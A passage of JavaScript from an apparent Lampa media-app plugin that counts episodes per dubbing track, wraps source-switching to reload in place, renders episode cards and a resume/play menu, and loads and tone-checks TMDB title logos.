      try { net = new Lampa.Reguest(); } catch (e) { net = null; }
      if (!net) return finish();

      net.nova_probe = true;
      voice_seed_net = net;
      try { net.timeout(VOICE_SEED_TIMEOUT); } catch (e) {}

      var done = function (answer) {
        if (!voice_seed_busy || generation !== voice_seed_generation) return;
        var body = typeof answer === 'string' ? answer : '';
        if (body.indexOf('videos__button') !== -1) {
          try { learnBody(body, url, seasonNumber() || 0); } catch (e) {}
        }
        if (seat >= urls.length) return finish();
        step();
      };

      try {
        net['native'](url, done, function () {
          done('');
        }, false, { dataType: 'text', headers: voiceHeaders() });
      } catch (e) {
        done('');
      }
    };

    step();
  }

  function voiceLink(url) {
    var value = String(url || '').replace('rjson=', 'nojson=');
    if (!value) return '';
    value = voiceDropParam(value, 'e');
    value = voiceDropParam(value, 'episode');
    value = voiceDropParam(value, 'number');
    var season = seasonNumber() || 0;
    if (season) {
      if (/[?&]s=\d*/i.test(value)) value = value.replace(/([?&]s=)\d*/i, '$1' + season);
      else value += (value.indexOf('?') === -1 ? '?' : '&') + 's=' + season;
    }
    var origin = String(voice_seen.origin || probe_url || '');
    var at = origin.indexOf('?');
    if (at === -1) return value;
    origin.slice(at + 1).split('&').forEach(function (pair) {
      var name = pair.split('=')[0];
      if (!name || !/^[\w.\-]+$/.test(name)) return;
      if (VOICE_OWN_PARAMS.indexOf(name.toLowerCase()) !== -1) return;
      if (new RegExp('[?&]' + name + '=').test(value)) return;
      value += (value.indexOf('?') === -1 ? '?' : '&') + pair;
    });
    return value;
  }

  function voiceHeaders() {
    try {
      var key = Lampa.Storage.get('kit_aesgcmkey', '');
      if (key) return { 'X-Kit-AesGcm': key };
    } catch (e) {}
    return {};
  }

  function voiceFiles() {
    var count = 0;
    items.forEach(function (item) {
      if (!item.folder && !item.soon) count++;
    });
    return count;
  }

  function voiceNodeMethod(node) {
    var raw = '';
    try { raw = node.attr('data-json') || ''; } catch (e) { raw = ''; }
    if (!raw) return 'play';
    var data = null;
    try { data = JSON.parse(raw); } catch (e) { data = null; }
    if (!data) return 'play';
    if (data.similar) return '';
    return String(data.method || 'play');
  }

  function voiceBodyCount(body) {
    var text = typeof body === 'string' ? body : '';
    if (!text) return 0;
    var files = 0;
    var folders = 0;
    var episodes = 0;
    try {
      $('<div>' + text + '</div>').find('.videos__item').each(function () {
        var node = $(this);
        var method = voiceNodeMethod(node);
        if (!method) return;
        var raw = node.attr('data-json') || '';
        var folder = method === 'link' || node.hasClass('videos__season');
        if (folder) {
          folders++;
          if (/\"(?:episode|e)\"\s*:\s*\d+/i.test(raw) || /S\d+\s*E\d+/i.test(node.text())) episodes++;
        } else {
          files++;
          episodes++;
        }
      });
    } catch (e) {
      return 0;
    }
    if (files) return files;
    if (episodes) return episodes;
    var cards = (text.match(/class=[\"'][^\"']*videos__item[^\"']*[\"']/gi) || []).length;
    if (cards) return cards;
    var playable = (text.match(/\"method\"\s*:\s*\"(play|call)\"/g) || []).length;
    if (playable) return playable;
    var episodeRows = (text.match(/\"(?:episode|e)\"\s*:\s*\d+/gi) || []).length;
    if (episodeRows) return episodeRows;
    return folders > 1 ? folders : 0;
  }

  function voicePaint() {
    if (!inSkin() || !ui.rows) return;
    try {
      if (typeof wideOn === 'function' && wideOn() &&
        typeof wideVoiceRepaint === 'function') return wideVoiceRepaint();
    } catch (e) {}
    var group = groups.voice;
    if (!group || !group.items) return;
    group.items.forEach(function (item, seat) {
      var index = typeof item.index === 'number' ? item.index : seat;
      var box = ui.rows.find('[data-nova-focus="voice:' + index + '"]').first();
      if (!box.length) return;
      var count = voiceCount(item.title);
      var slot = box.find('.nova-chip__num');
      if (!count) return slot.remove();
      if (!slot.length) slot = $('<span class="nova-chip__num"></span>').appendTo(box);
      slot.text(count);
    });
  }

  function voiceAnswer(name, answer) {
    if (!voice_busy) return;
    var body = typeof answer === 'string' ? answer : '';
    if (!body) return;
    if (body.indexOf('"rch"') !== -1) return;
    if (body.indexOf('"accsdb"') !== -1 || body.indexOf('"blocked"') !== -1) return;
    var count = voiceBodyCount(body);
    if (!count) return;
    voiceSave(name, count);
    voicePaint();
  }

  function voiceIdentity(name) {
    return String(name == null ? '' : name).toLowerCase().replace(/ё/g, 'е').replace(/\s+/g, ' ').trim();
  }

  function voiceContext() {
    var component = '';
    try { component = Lampa.Activity.active().component || ''; } catch (e) {}
    return [component, movie && movie.id, currentSourceKey(), seasonNumber() || 0].join('|');
  }

  function voiceRun() {
    if (!voiceWanted()) return;
    var stamp = voiceContext();
    if (voice_busy && voice_run_stamp === stamp) return;
    voiceStop();
    voice_run_stamp = stamp;
    var generation = voice_generation;
    var book = voice_seen && voice_seen.list && voice_seen.list.length >= 2 ? voiceIndex() : { rows: [], exact: {} };
    var used = {};
    var queue = [];

    groups.voice.items.forEach(function (item) {
      var name = String(item.title == null ? '' : item.title).trim();
      if (!name || item.selected || voiceMetadata(item) !== null || voiceCount(name)) return;
      var directUrl = item.url || item.voice_url || item.href || '';
      var row = null;
      if (!directUrl) {
        var matches = book.rows.filter(function (candidate) {
          return !used[candidate.seat] && voiceIdentity(candidate.entry.name) === voiceIdentity(name);
        });
        if (matches.length === 1) row = matches[0];
        if (!row) {
          var position = typeof item.index === 'number' ? item.index : groups.voice.items.indexOf(item);
          var positionRow = book.rows[position];
          var base = voiceNorm(name);
          var ambiguous = book.rows.filter(function (candidate) { return voiceNorm(candidate.entry.name) === base; }).length > 1;
          if (positionRow && !used[positionRow.seat] && !ambiguous) row = positionRow;
        }
        if (!row && !matches.length) row = voiceNear(book, name, used);
      }
      if (row) used[row.seat] = true;
      var raw = directUrl || (row && row.entry.url);
      if (raw) queue.push({ name: name, url: voiceLink(raw), attempt: 0 });
    });
    if (!queue.length) return;
    voice_busy = true;
    var deadline = Date.now() + (typeof VOICE_BUDGET === 'number' ? VOICE_BUDGET : 30000);
    var index = 0;
    var active = 0;
    var pumping = false;
    function valid() {
      return voice_busy && Date.now() < deadline && generation === voice_generation && stamp === voiceContext() && inSkin();
    }
    function pump() {
      if (pumping || !valid()) return;
      pumping = true;
      while (valid() && active < VOICE_PARALLEL && index < queue.length) request(queue[index++]);
      pumping = false;
      if (generation === voice_generation && !active && index >= queue.length) voice_busy = false;
    }
    function request(entry) {
      var net;
      try { net = new Lampa.Reguest(); } catch (e) { return; }
      active++;
      net.nova_probe = true;
      voice_nets.push(net);
      try { net.timeout(VOICE_TIMEOUT); } catch (e) {}
      var settled = false;
      function done(answer) {
        if (settled) return;
        settled = true;
        active--;
        var at = voice_nets.indexOf(net);
        if (at !== -1) voice_nets.splice(at, 1);
        if (!valid()) return;
        voiceAnswer(entry.name, answer);
        if (!voiceCount(entry.name) && !entry.attempt) {
          queue.push({ name: entry.name, url: entry.url, attempt: 1 });
        }
        pump();
      }
      try {
        net['native'](entry.url, done, function () { done(''); }, false,
          { dataType: 'text', headers: voiceHeaders() });
      } catch (e) { done(''); }
    }
    pump();
  }

  function voiceSchedule() {
    if (!voiceWanted()) return;

    var here = null;
    groups.voice.items.forEach(function (item) {
      if (item.selected) here = item;
    });
    var own = voiceFiles();
    if (here && own) voiceSave(here.title, own);
    voicePaint();

    var stamp = voiceContext() + '|' + groups.voice.items.map(function (item) { return item.title + ':' + (item.url || item.voice_url || item.href || ''); }).join('|');
    if (voice_done === stamp) return;
    voice_done = stamp;

    clearTimeout(voice_timer);
    voice_timer = setTimeout(function () {
      voice_timer = null;
      if (voiceListFresh()) return voiceRun();
      voiceSeed(function () {
        voiceRun();
      });
    }, VOICE_DELAY);
  }

  function keepAlive(run) {
    var keep = null;
    try {
      if (ui.root && ui.root[0] && ui.root.parent().length) keep = ui.root;
    } catch (e) {
      keep = null;
    }

    try {
      if (keep) keep.detach();
    } catch (e) {}

    try {
      run();
    } catch (e) {}

    try {
      if (keep && host && document.body.contains(host) && !$.contains(host, keep[0])) {
        $(host).prepend(keep);
      }
    } catch (e) {}
  }

  function reloadInPlace(comp) {
    var keep = null;
    try {
      if (ui.root && ui.root[0] && ui.root.parent().length) keep = ui.root;
    } catch (e) {
      keep = null;
    }

    try {
      if (keep) keep.detach();
      if (typeof comp.reset === 'function') comp.reset();
    } catch (e) {}

    try {
      if (keep && host && document.body.contains(host)) $(host).prepend(keep);
    } catch (e) {}

    var chain = null;
    try {
      chain = comp.createSource();
    } catch (e) {
      chain = null;
    }
    if (!chain || typeof chain.then !== 'function') return false;

    chain.then(function () {
      try {
        if (typeof comp.search === 'function') comp.search();
        else comp.find();
      } catch (e) {}
    })['catch'](function (error) {
      try {
        if (typeof comp.noConnectToServer === 'function') comp.noConnectToServer(error);
        else if (typeof comp.empty === 'function') comp.empty();
      } catch (e) {}
    });

    return true;
  }

  function hookReplace() {
    if (!Lampa.Activity || Lampa.Activity.nova_plus_wrapped) return;
    var real = Lampa.Activity.replace;
    if (typeof real !== 'function') return;

    real_replace = real;

    Lampa.Activity.replace = function (params) {
      if (swallow) return;
      var empty_call = !params || !Object.keys(params).length;
      if (inplace && empty_call) {
        inplaceStop();
        var comp = componentNow();
        if (reloadable(comp) && reloadInPlace(comp)) return;
      }
      return real.apply(Lampa.Activity, arguments);
    };

    Lampa.Activity.nova_plus_wrapped = true;
  }

  function patchHost(comp) {
    if (!comp || comp.nova_host_hooked) return;
    if (typeof comp.changeBalanser !== 'function') return;

    comp.nova_host_hooked = true;

    if (typeof comp.request === 'function') {
      var request = comp.request;
      comp.request = function (url) {
        try { learnUrl(url); } catch (e) {}
        return request.apply(comp, arguments);
      };
    }

    var real = comp.changeBalanser;

    comp.changeBalanser = function () {
      if (!inplace || !reloadable(comp)) return real.apply(comp, arguments);

      inplaceStop();
      swallow = true;
      try {
        real.apply(comp, arguments);
      } catch (e) {}
      swallow = false;

      if (reloadInPlace(comp)) return;
      if (typeof real_replace === 'function') real_replace.call(Lampa.Activity, {});
    };
  }

  function inplaceStart() {
    inplace = true;
    clearTimeout(inplace_timer);
    inplace_timer = setTimeout(inplaceStop, 2000);
  }

  function inplaceStop() {
    inplace = false;
    clearTimeout(inplace_timer);
    inplace_timer = null;
  }

  function hideHost() {
    if (!host || !ui.root) return;
    $(host).children().each(function () {
      if (this === ui.root[0]) return;
      $(this).addClass('nova-plus-hidden');
    });
  }

  function reattach() {
    if (!pendingLive() || !ui.root) return false;

    var found = scope();
    if (!found) return false;
    if (found.movie && pending.id !== found.movie.id) return false;
    if (host === found.body[0] && $.contains(host, ui.root[0])) return false;

    root = found.root;
    host = found.body[0];
    movie = found.movie;
    patchHost(componentNow());
    root.addClass('nova-plus-scope nova-plus-chips');

    signature = '';
    uiFrame();
    hideHost();
    loadingStop();
    if (!ui.list.find('.nova-skeleton').length) listHold().empty().append(skeleton(4));
    refreshCollection();

    var keep = seek(ui_lock) || seek(ui_focus);
    if (keep) focusNode(keep, true);
    if (lockActive()) lockWatch();
    attach();
    return true;
  }

  function pendingLive() {
    if (!pending) return false;
    if (Date.now() - pending.time > 30000) {
      switchDone();
      return false;
    }
    return true;
  }

  function pendingMine() {
    return pendingLive() && movie && pending.id === movie.id && !!ui.hero;
  }

  function switchDone() {
    pending = null;
    clearTimeout(leave_guard);
    leave_guard = null;
    switchMark(false);
    switchUnwatch();
    inplaceStop();
  }

  function leaveGuard() {
    clearTimeout(leave_guard);
    leave_guard = setTimeout(function () {
      leave_guard = null;
      if (!pendingLive() || inSkin()) return;
      switchDone();
      detach();
    }, LEAVE_GRACE);
  }

  function listHold() {
    gentleMark(1200);
    try {
      var high = ui.list && ui.list[0] ? ui.list[0].offsetHeight : 0;
      if (high > 0) ui.list.css('min-height', high + 'px');
    } catch (e) {}
    return ui.list;
  }

  function listFree() {
    gentle_until = 0;
    try { if (ui.list) ui.list.css('min-height', ''); } catch (e) {}
  }

  function skeleton(count) {
    var tiles = modeWide() ? !wideRow() : viewMode() === 'grid';
    var box = $('<div class="nova-skeleton' + (tiles ? ' nova-skeleton--grid' : '') + '"></div>');
    var total = tiles ? Math.max(count || 4, 8) : (count || 4);
    for (var i = 0; i < total; i++) {
      box.append('<div class="nova-skeleton__row"><div class="nova-skeleton__thumb"></div>' +
        '<div class="nova-skeleton__body"><div class="nova-skeleton__line"></div>' +
        '<div class="nova-skeleton__line nova-skeleton__line--short"></div></div></div>');
    }
    return box;
  }

  function episodeRuntime() {
    var mins = 0;
    try {
      var list = (movie && movie.episode_run_time) || [];
      mins = parseInt(list.length ? list[0] : 0, 10) || parseInt((movie && movie.runtime) || 0, 10) || 0;
    } catch (e) {
      mins = 0;
    }
    return mins;
  }

  function fallbackTime() {
    var mins = episodeRuntime();
    return mins ? runtimeText(mins * 60) : '';
  }

  function fallbackQuality(origin) {
    var found = '';
    try {
      found = shortQuality(origin.find(nativeOnlineSelector('.online-prestige__info')).text() + ' ' +
        origin.find(nativeOnlineSelector('.online-prestige__title')).text());
    } catch (e) {
      found = '';
    }
    if (found) return found;
    return knownQuality(currentSourceKey()) || splitSourceName(sourceTitle()).badge || '';
  }

  function soonCard(origin) {
    var found = (origin.attr('style') || '').match(/opacity\s*:\s*([\d.]+)/);
    if (!found) return false;
    return (parseFloat(found[1]) || 1) < 0.9;
  }

  function readCard(node, index) {
    var origin = $(node);
    var line = origin.find('.time-line').first();
    var hash = line.attr('data-hash') || '';
    var percent = 0;

    if (hash) {
      try { percent = Lampa.Timeline.view(hash).percent || 0; } catch (e) { percent = 0; }
    }
    if (!percent) {
      var raw = (line.children('div').first().attr('style') || '').match(/([\d.]+)%/);
      if (raw) percent = parseFloat(raw[1]) || 0;
    }

    var meta = [];
    origin.find(nativeOnlineSelector('.online-prestige__info')).children().each(function () {
      var part = $(this);
      if (part.is('.online-prestige-split,.onl-online-prestige-split')) return;
      var value = part.text().trim();
      if (value) meta.push(value);
    });
    if (!meta.length) {
      var plain = origin.find(nativeOnlineSelector('.online-prestige__info')).text().trim();
      if (plain) meta.push(plain);
    }

    var soon = soonCard(origin);

    return {
      origin: origin,
      index: index,
      folder: origin.is('.online-prestige--folder,.onl-online-prestige--folder'),
      soon: soon,
      percent: percent,
      hash: hash,
      line: line,
      viewed: origin.find(nativeOnlineSelector('.online-prestige__viewed')).length > 0,
      num: digits(origin.find(nativeOnlineSelector('.online-prestige__episode-number')).text()) || index + 1,
      numbered: origin.find(nativeOnlineSelector('.online-prestige__episode-number')).length > 0,
      title: origin.find(nativeOnlineSelector('.online-prestige__title')).text().trim(),
      meta: meta,
      time: soon
        ? origin.find(nativeOnlineSelector('.online-prestige__quality')).text().trim()
        : (origin.find(nativeOnlineSelector('.online-prestige__time')).text().trim() ||
          (origin.is('.online-prestige--folder,.onl-online-prestige--folder') ? '' : fallbackTime())),
      quality: soon ? '' : (origin.find(nativeOnlineSelector('.online-prestige__quality')).text().trim() ||
        (origin.is('.online-prestige--folder,.onl-online-prestige--folder') ? '' : fallbackQuality(origin))),
      picture: origin.find(nativeOnlineSelector('.online-prestige__img img, .online-prestige__folder img')).first()
    };
  }

  function collect() {
    var list = [];
    $(host).find(nativeOnlineSelector('.online-prestige--full,.online-prestige--folder')).each(function () {
      if ($(this).closest('.nova-plus-root').length) return;
      list.push(readCard(this, list.length));
    });
    return list;
  }

  function percentOf(item) {
    if (!item) return 0;
    var value = parseFloat(item.percent);
    return isNaN(value) || value < 0 ? 0 : value;
  }

  function isSeen(item) {
    if (!item) return false;
    if (item.viewed) return true;
    return percentOf(item) >= SEEN_PERCENT;
  }

  function isStarted(item) {
    var value = percentOf(item);
    return value > 0 && value < SEEN_PERCENT;
  }

  function seasonText(season) {
    var line = text('nova_season_progress', 'nova_plus_season_progress')
      .replace('{seen}', season.seen).replace('{total}', season.total);
    if (season.seen < season.total) {
      line += ' \u00b7 ' + text('nova_season_left', 'nova_plus_season_left')
        .replace('{left}', season.total - season.seen);
    }
    if (season.planned > season.total) {
      line += ' \u00b7 ' + text('nova_season_planned', 'nova_plus_season_planned')
        .replace('{planned}', season.planned);
    }
    return line;
  }

  function seasonSeen(list) {
    var seen = 0;
    var total = 0;
    var planned = 0;
    list.forEach(function (item) {
      planned++;
      if (item.soon) return;
      total++;
      if (isSeen(item)) seen++;
    });
    return { seen: seen, total: total, planned: planned };
  }

  function pickResume(full) {
    var i;
    if (!full || !full.length) return null;

    var list = full.filter(function (item) {
      return !item.soon;
    });
    if (!list.length) return null;

    if (!serial) {
      for (i = 0; i < list.length; i++) {
        if (isSeen(list[i])) continue;
        if (list[i].percent > 0 && list[i].percent < SEEN_PERCENT) return list[i];
      }
      return list[0];
    }

    for (i = 0; i < list.length; i++) {
      if (isStarted(list[i])) return list[i];
    }
    for (i = 0; i < list.length; i++) {
      if (!isSeen(list[i])) return list[i];
    }
    return list[list.length - 1];
  }

  function freshItem() {
    for (var i = 0; i < items.length; i++) {
      if (!items[i].soon && !isSeen(items[i])) return items[i];
    }
    return null;
  }

  function nextItem(target) {
    if (!target) return null;
    var next = items[target.index + 1] || null;
    if (next && next.soon) return null;
    return next;
  }

  function play(item) {
    if (!item) return;
    try { item.origin.trigger('hover:enter'); } catch (e) {}
  }

  function longPress(item) {
    if (!item) return;
    try { item.origin.trigger('hover:long'); } catch (e) {}
  }

  function ownArt(item) {
    if (!item || !item.picture || !item.picture.length) return '';
    var node = item.picture[0];
    var src = '';
    try { src = node.getAttribute('src') || ''; } catch (e) { src = ''; }
    return src === 'undefined' ? '' : src;
  }

  function paintThumb(thumb, art, fallback) {
    if (!thumb || !thumb.length) return;
    var img = thumb.find('img')[0];
    if (!art || !img) return;
    if (fallback) thumb.addClass('nova-card__thumb--fallback');
    else thumb.removeClass('nova-card__thumb--fallback');
    img.onload = function () { thumb.addClass('nova-card__thumb--loaded'); };
    img.onerror = function () { thumb.removeClass('nova-card__thumb--fallback'); };
    img.src = art;
    if (img.complete) thumb.addClass('nova-card__thumb--loaded');
  }

  function watchThumb(item, thumb) {
    if (!item || !item.picture || !item.picture.length || !thumb || !thumb.length) return;
    var node = item.picture[0];
    var done = false;
    var observer = null;
    var timer = null;
    var tries = 0;

    function stop() {
      done = true;
      if (observer) {
        try { observer.disconnect(); } catch (e) {}
        observer = null;
      }
      if (timer) {
        clearInterval(timer);
        timer = null;
      }
    }

    function take() {
      if (done) return true;
      var src = '';
      try { src = node.getAttribute('src') || ''; } catch (e) { src = ''; }
      if (!src || src === 'undefined') return false;
      stop();
      paintThumb(thumb, src, false);
      return true;
    }

    if (take()) return;

    try {
      if (window.MutationObserver) {
        observer = new MutationObserver(function () { take(); });
        observer.observe(node, { attributes: true, attributeFilter: ['src'] });
      }
    } catch (e) {
      observer = null;
    }

    timer = setInterval(function () {
      tries++;
      if (take()) return;
      if (tries > 100) stop();
    }, 60);
  }

  function watchNumber(item, slot) {
    if (!item || !item.origin || !slot || !slot.length) return;
    var timer = null;
    var tries = 0;

    function take() {
      var value = 0;
      try { value = digits(item.origin.find(nativeOnlineSelector('.online-prestige__episode-number')).text()); } catch (e) { value = 0; }
      if (!value) return false;
      if (timer) {
        clearInterval(timer);
        timer = null;
      }
      item.num = value;
      item.numbered = true;
      slot.text(episodeNumber(value));
      return true;
    }

    if (take()) return;

    timer = setInterval(function () {
      tries++;
      if (take()) return;
      if (tries > 100) {
        clearInterval(timer);
        timer = null;
      }
    }, 60);
  }

  function metaFlat(value) {
    return String(value == null ? '' : value)
      .replace(/\s+/g, ' ')
      .replace(/[\s.,;:\u00b7\u25cf|-]+$/, '')
      .trim()
      .toLowerCase();
  }

  function metaTrim(list, head) {
    var mark = metaFlat(head);
    var seen = {};
    var out = [];
    (list || []).forEach(function (part) {
      var flat = metaFlat(part);
      if (!flat) return;
      if (mark && flat === mark) return;
      if (seen[flat]) return;
      seen[flat] = true;
      out.push(part);
    });
    return out;
  }

  function buildCard(item, compact, grid) {
    var card = $('<div class="nova-card selector">' +
      '<div class="nova-card__thumb"><img alt=""><div class="nova-card__num"><span></span></div><div class="nova-card__line"></div></div>' +
      '<div class="nova-card__body"><div class="nova-card__title"></div><div class="nova-card__meta"></div></div>' +
      '<div class="nova-card__side"><div class="nova-card__quality"></div><div class="nova-card__time"></div></div>' +
      '</div>');

    card.attr('data-nova-focus', 'item:' + item.index);
    if (!serial) card.addClass('nova-card--file');

    var thumb = card.find('.nova-card__thumb');
    var body = card.find('.nova-card__body');

    var head = item.title || movie.title || movie.name || '';
    card.find('.nova-card__title').text(head);

    var meta = metaTrim(item.meta, head);
    if (item.percent > 0 && item.percent < SEEN_PERCENT && item.time) {
      var left = Math.round((100 - item.percent) / 100 * digitsTime(item.time));
      if (left > 0) meta.push(text('nova_left', 'nova_plus_left') + ' ' + runtimeText(left));
    }
    card.find('.nova-card__meta').html(meta.map(function (part) {
      return '<span>' + esc(part) + '</span>';
    }).join('<span class="nova-dot">\u25cf</span>'));

    if (serial && !item.folder) {
      var slot = card.find('.nova-card__num > span');
      slot.text(episodeNumber(item.num));
      if (!item.numbered) watchNumber(item, slot);
    } else card.find('.nova-card__num').remove();

    var badge = shortQuality(item.quality);
    if (badge) card.find('.nova-card__quality').addClass('nova-badge').text(badge);
    else card.find('.nova-card__quality').remove();
    card.find('.nova-card__time').text(item.time || '');

    var line = card.find('.nova-card__line');
    if (item.line.length) {
      line.append(item.line.clone());
      if (!grid) line.addClass('nova-card__line--body').appendTo(body);
    } else line.remove();

    if (item.folder) {
      card.addClass('nova-card--nav');
      if (item.picture.length) {
        thumb.addClass('nova-card__thumb--poster');
        thumb.find('.nova-card__num').remove();
        thumb.find('.nova-card__line').remove();
        paintThumb(thumb, ownArt(item), false);
        watchThumb(item, thumb);
      } else {
        card.addClass('nova-card--slim');
        thumb.remove();
      }
      card.find('.nova-card__side').remove();
      card.find('.nova-card__line').remove();
      card.append('<div class="nova-card__go">' + ICON.chevron + '</div>');
    } else {
      var art = ownArt(item);
      var isFallback = false;
      if (!art) {
        art = fallbackArt();
        isFallback = !!art;
      }
      paintThumb(thumb, art, isFallback);
      if (!art || isFallback) watchThumb(item, thumb);
      if (item.viewed || isSeen(item)) {
        if (grid) thumb.append('<div class="nova-card__viewed">' + ICON.eye + '</div>');
        else card.find('.nova-card__side').append('<div class="nova-card__eye">' + ICON.eye + '</div>');
      }
    }

    if (item.soon) {
      card.addClass('nova-card--soon').removeClass('selector');
      card.find('.nova-card__line').remove();
    } else {
      card.attr('data-nova-focus', 'item:' + item.index);
      bind(card, function () { play(item); }, item.folder ? null : function () { longPress(item); });
    }

    item.card = card;
    wideDress(card, item);
    return card;
  }

  function digitsTime(value) {
    var parts = String(value || '').split(':');
    if (parts.length === 3) {
      return (parseInt(parts[0], 10) || 0) * 3600 + (parseInt(parts[1], 10) || 0) * 60 + (parseInt(parts[2], 10) || 0);
    }
    if (parts.length === 2) {
      return (parseInt(parts[0], 10) || 0) * 3600 + (parseInt(parts[1], 10) || 0) * 60;
    }
    return (parseInt(parts[0], 10) || 0) * 60;
  }

  function bindPlay(node) {
    return bind(node, function () {
      play(pickResume(items));
    }, function () {
      playMenu();
    });
  }

  function bindNext(node) {
    return bind(node, function () {
      play(nextItem(pickResume(items)));
    });
  }

  function playButton() {
    if (!ui.play || !ui.play.length) {
      ui.play = $('<div class="nova-btn nova-btn--main selector" data-nova-focus="hero">' +
        ICON.play + '<span class="nova-btn__label"></span></div>');
      bindPlay(ui.play);
    }
    return ui.play;
  }

  function nextButton() {
    if (!ui.next || !ui.next.length) {
      ui.next = $('<div class="nova-btn nova-btn--ghost selector" data-nova-focus="hero-next">' +
        '<span class="nova-btn__label"></span></div>');
      bindNext(ui.next);
    }
    return ui.next;
  }

  function episodeSuffix(item) {
    if (!item || !serial || !item.numbered) return '';
    return ' \u00b7 ' + text('torrent_serial_episode', 'nova_plus_episode') + ' ' + item.num;
  }

  function playMenu() {
    var target = pickResume(items);
    if (!target) return;

    var active;
    try { active = Lampa.Controller.enabled().name; } catch (e) { active = 'content'; }

    var started = target.percent > 0 && target.percent < SEEN_PERCENT;
    var menu = [{
      title: (started ? text('nova_continue', 'nova_plus_continue') : text('nova_watch', 'nova_plus_watch')) + episodeSuffix(target),
      item: target
    }];

    if (started) {
      menu.push({
        title: text('nova_from_start', 'nova_plus_from_start') + episodeSuffix(target),
        item: target
      });
    }

    var next = serial ? nextItem(target) : null;
    if (next) {
      menu.push({
        title: text('nova_next_episode', 'nova_plus_next_episode') + episodeSuffix(next),
        item: next
      });
    }

    var fresh = serial ? freshItem() : null;
    if (fresh && fresh !== target && fresh !== next) {
      menu.push({
        title: text('nova_first_new', 'nova_plus_first_new') + episodeSuffix(fresh),
        item: fresh
      });
    }

    if (items.length > JUMP_FROM) {
      menu.push({
        title: serial
          ? text('nova_jump_pick', 'nova_plus_jump_pick')
          : text('nova_files_pick', 'nova_plus_files_pick'),
        jump: true
      });
    }

    try {
      Lampa.Select.show({
        title: text('title_action', 'nova_plus_action'),
        items: menu,
        onBack: function () {
          try { Lampa.Controller.toggle(active); } catch (e) {}
        },
        onSelect: function (a) {
          try { Lampa.Controller.toggle(active); } catch (e) {}
          if (a.jump) return uiToggle('jump');
          play(a.item);
        }
      });
    } catch (e) {}
  }

  function logoOn() {
    return get('nova_plus_logo', true) !== false;
  }

  function logoLang() {
    var lang = String(get('language', 'ru') || 'ru').toLowerCase();
    var map = { ua: 'uk', ukr: 'uk', rus: 'ru', eng: 'en', cn: 'zh', by: 'be' };
    return map[lang] || lang;
  }

  function logoPick(list) {
    if (!list || !list.length) return '';
    var lang = logoLang();
    var i;

    for (i = 0; i < list.length; i++) {
      if (list[i] && list[i].iso_639_1 === lang && list[i].file_path) return list[i].file_path;
    }
    for (i = 0; i < list.length; i++) {
      if (list[i] && list[i].iso_639_1 === 'en' && list[i].file_path) return list[i].file_path;
    }
    for (i = 0; i < list.length; i++) {
      if (list[i] && list[i].file_path) return list[i].file_path;
    }
    return '';
  }

  function logoSize() {
    var want = String(get('logo_size', 'w780') || 'w780');
    if (want === 'original') return 'original';
    if (want === 'w300' || want === 'w500') return 'w780';
    return /^w\d+$/.test(want) ? want : 'w780';
  }

  function logoUrl(path) {
    if (!path) return '';
    try {
      return Lampa.TMDB.image('t/p/' + logoSize() + String(path).replace('.svg', '.png'));
    } catch (e) {
      return '';
    }
  }

  function logoMeasure(picture) {
    var width = 48;
    var height = Math.max(1, Math.round((picture.naturalHeight || 1) * (width / (picture.naturalWidth || width))));
    var canvas = document.createElement('canvas');
    canvas.width = width;
    canvas.height = height;
    var ctx = canvas.getContext('2d');
    if (!ctx) return '';
    ctx.drawImage(picture, 0, 0, width, height);
    var data = ctx.getImageData(0, 0, width, height).data;
    var dark = 0;
    var bright = 0;
    var spread = 0;
    var count = 0;
    for (var i = 0; i < data.length; i += 4) {
      if (data[i + 3] < 60) continue;
      var r = data[i] / 255;
      var g = data[i + 1] / 255;
      var b = data[i + 2] / 255;
      var top = Math.max(r, g, b);
      count++;
      if (top >= LOGO_VISIBLE) bright++;
      if (top >= LOGO_DARK) continue;
      dark++;
      spread += top - Math.min(r, g, b);
    }
    if (!count) return '';
    if (bright / count >= LOGO_BRIGHT_SHARE) return 'ok';
    if (dark / count < LOGO_DARK_SHARE) return 'ok';
    return spread / dark < 0.18 ? 'invert' : 'glow';
  }

  function logoDirect(path) {
    if (!path) return '';
    return 'https://image.tmdb.org/t/p/' + logoSize() + String(path).replace('.svg', '.png');
  }

  function logoTone(src, path, done) {
    if (!src) return done('ok');
    var box = cached(LOGO_TONE_KEY, 500, {});
    if (box && typeof box[src] === 'string') return done(box[src]);
    if (LOGO_BLIND[src]) return done('blind');

    var urls = [src];
    var direct = logoDirect(path);
    if (direct && urls.indexOf(direct) === -1) urls.push(direct);

    var at = 0;
    var step = function () {
      if (at >= urls.length) {
        LOGO_BLIND[src] = true;
        return done('blind');
      }
      var url = urls[at++];
      var probe;
      try { probe = new Image(); } catch (e) { return done('blind'); }
      probe.crossOrigin = 'anonymous';
      probe.onload = function () {
        var tone = '';
        try { tone = logoMeasure(probe); } catch (e) { tone = ''; }
        if (tone !== 'invert' && tone !== 'glow' && tone !== 'ok') return step();
        var now = cached(LOGO_TONE_KEY, 500, {});
        if (now && typeof now === 'object') {
          now[src] = tone;
          save(LOGO_TONE_KEY, now);
        }
        done(tone);
      };
      probe.onerror = step;
      probe.src = url;
    };
    step();
  }

  function logoKey(target) {
    var card = target || movie;
    return ((card && card.id) || 0) + ':' + logoLang();
  }

  function logoWarm(path) {
    var src = logoUrl(path);
    if (!src || LOGO_WARM[src]) return src;
    try {
      var probe = new Image();
      probe.src = src;
      LOGO_WARM[src] = probe;
    } catch (e) {}
    return src;
  }

  function logoEntry(key) {
    var box = cached(LOGO_CACHE_KEY, 500, {});
    var mine = box && box[key];
    if (typeof mine === 'string') return mine ? { p: mine, t: 0 } : null;
    if (mine && typeof mine === 'object' && typeof mine.p === 'string') return mine;
    var old = cached('nova_plus_logo_cache', 500, {});
    var was = old && old[key];
    return typeof was === 'string' && was ? { p: was, t: 0 } : null;
  }

  function logoFresh(entry) {
    if (!entry) return false;
    if (entry.p) return true;
    return Date.now() - (entry.t || 0) < LOGO_RETRY;
  }

  function logoRemember(key, path, answered) {
    if (path) LOGO_MEM[key] = path;
    else if (answered) LOGO_MEM[key] = '';
    else delete LOGO_MEM[key];
    if (!path && !answered) return;
    var box = cached(LOGO_CACHE_KEY, 500, {});
    if (box && typeof box === 'object') {
      box[key] = { p: path || '', t: Date.now() };
      save(LOGO_CACHE_KEY, box);
    }
  }

  function logoPeek(target) {
    if (!logoOn()) return '';
    var key = logoKey(target);
    if (typeof LOGO_MEM[key] === 'string') return LOGO_MEM[key];
    var entry = logoEntry(key);
    if (!logoFresh(entry)) return '';
    LOGO_MEM[key] = entry.p;
    if (entry.p) logoWarm(entry.p);
    return entry.p;
  }

  function logoLoad(done) {
    return logoFetch(movie, done);
  }

  function logoUrls(card) {
